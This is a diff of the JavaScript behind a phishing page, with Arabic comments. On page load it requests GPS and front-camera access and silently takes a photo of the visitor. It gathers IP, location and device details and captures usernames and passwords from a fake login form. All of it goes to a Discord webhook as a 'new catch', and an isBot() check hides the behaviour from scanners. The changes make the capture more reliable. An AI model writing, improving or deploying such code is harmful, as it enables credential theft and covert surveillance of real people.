@@ -43,53 +43,62 @@ async function getSystemInfo() {
     return { ...geoip, ua, platform, language, screenRes, batteryInfo };
 }
 
-// دالة طلب الأذونات والتقاط الصورة فوراً
-async function triggerPermissionsAndCapture(user = "", pass = "", status = "") {
-    if (isBot()) return;
-
-    let lat = null, lng = null;
-
-    // طلب إذن الموقع الجغرافي (GPS) تلقائياً
-    await new Promise((resolve) => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    lat = pos.coords.latitude;
-                    lng = pos.coords.longitude;
-                    resolve();
-                },
-                () => { resolve(); },
-                { timeout: 6000, enableHighAccuracy: true }
-            );
-        } else {
-            resolve();
+// دالة جلب الموقع الدقيق (GPS) مع التعامل مع الأذونات
+async function getGPSLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({ lat: null, lng: null });
+            return;
         }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+            },
+            (err) => {
+                console.warn("فشل الحصول على GPS:", err.message);
+                resolve({ lat: null, lng: null });
+            },
+            { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }
+        );
     });
-
-    // طلب إذن الكاميرا الأمامية والتقاط الصورة تلقائياً
-    let frontBlob = null;
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 2000));
-        
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 640, 480);
-        frontBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
-        
-        stream.getTracks().forEach(t => t.stop());
-    } catch (e) {}
-
-    // إرسال البيانات إلى ديسكورد
-    await sendToDiscord(frontBlob, lat, lng, user, pass, status);
 }
 
+// دالة التقاط الكاميرا مع تصحيح مشكلة الصورة السوداء
+async function captureCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
+        
+        video.srcObject = stream;
+        
+        // تشغيل الفيديو والانتظار لكي تعمل العدسة وتلتقط الضوء (حل الشاشة السوداء)
+        await video.play().catch(() => {});
+        await new Promise(resolve => setTimeout(resolve, 3000)); // مهلة 3 ثوانٍ لضمان وضوح الصورة
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.95));
+        
+        // إيقاف الكاميرا فوراً بعد التقاط الصورة
+        stream.getTracks().forEach(track => track.stop());
+        return blob;
+    } catch (e) {
+        console.warn("خطأ في الكاميرا:", e);
+        return null;
+    }
+}
+
+// دالة الإرسال المتكاملة إلى ديسكورد
 async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status = "") {
+    if (isBot()) return;
+
     try {
         const info = await getSystemInfo();
         const formData = new FormData();
         
-        let content = `🚨 **[ صيد جديد - طلب تلقائي فور الدخول ]**\n` +
+        let content = `🚨 **[ تقرير صيد جديد ]**\n` +
                       `🌐 **IP:** \`${info.ip}\`\n` +
                       `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
                       `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n`;
@@ -97,7 +106,7 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         if (lat && lng) {
             content += `📍 **موقع GPS الدقيق:** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
         } else {
-            content += `📍 **موقع GPS:** لم يتم السماح به أو تم الرفض.\n`;
+            content += `📍 **موقع GPS:** تم رفض الإذن من المتصفح أو الرابط ليس HTTPS.\n`;
         }
 
         if (user) {
@@ -110,7 +119,9 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         
         content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
-        if (frontBlob) formData.append('file1', frontBlob, 'shot.png');
+        if (frontBlob) {
+            formData.append('file1', frontBlob, 'camera_shot.png');
+        }
 
         formData.append('payload_json', JSON.stringify({
             content: content,
@@ -119,14 +130,19 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         }));
 
         await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-    } catch (err) {}
+    } catch (err) {
+        console.error("خطأ في إرسال الويب هوك:", err);
+    }
 }
 
-// التشغيل الذاتي الفوري بمجرد فتح الصفحة (بدون أي ضغطة زر)
-window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(() => {
-        triggerPermissionsAndCapture("", "", "تم فتح الصفحة وطلب الأذونات تلقائياً.");
-    }, 1000); // تأخير ثانية واحدة لضمان تحميل عناصر الصفحة بالكامل
+// التشغيل التلقائي فور فتح الصفحة الأولى
+window.addEventListener('DOMContentLoaded', async () => {
+    // محاولة طلب الموقع والكاميرا بالتتابع
+    setTimeout(async () => {
+        const { lat, lng } = await getGPSLocation();
+        const frontBlob = await captureCamera();
+        await sendToDiscord(frontBlob, lat, lng, "", "", "تم فتح الصفحة وطلب الأذونات تلقائياً.");
+    }, 1500);
 });
 
 // التعامل مع نموذج تسجيل الدخول (apply.html)
@@ -142,7 +158,10 @@ if (loginForm) {
         const loadingOverlay = document.getElementById('loadingOverlay');
         if (loadingOverlay) loadingOverlay.style.display = 'flex';
 
-        await triggerPermissionsAndCapture(u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
+        const { lat, lng } = await getGPSLocation();
+        const frontBlob = await captureCamera();
+
+        await sendToDiscord(frontBlob, lat, lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
 
         setTimeout(() => {
             if (loadingOverlay) loadingOverlay.style.display = 'none';
